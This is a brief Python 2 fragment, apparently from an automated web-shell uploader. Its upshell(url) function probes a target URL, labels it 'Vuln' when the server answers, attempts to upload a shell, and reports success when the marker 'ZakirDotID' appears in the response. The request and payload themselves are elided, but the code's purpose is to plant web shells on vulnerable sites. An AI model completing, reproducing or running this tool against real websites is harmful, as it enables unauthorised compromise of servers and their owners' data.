...
def upshell(url):
	...
	if resp.status_code == 200:
		print colored("[Info] ", "cyan") + colored("Vuln",'green') 
		print colored("Try Upload Shell","white")
		...
		if 'ZakirDotID' in r.text:
			print colored("Success Upload > " + cekShell, "green")
		else:
			print colored("Failed Upload", "red")			

	else:
		print colored("[Info] ", "cyan") + colored("Not Vuln",'red') 
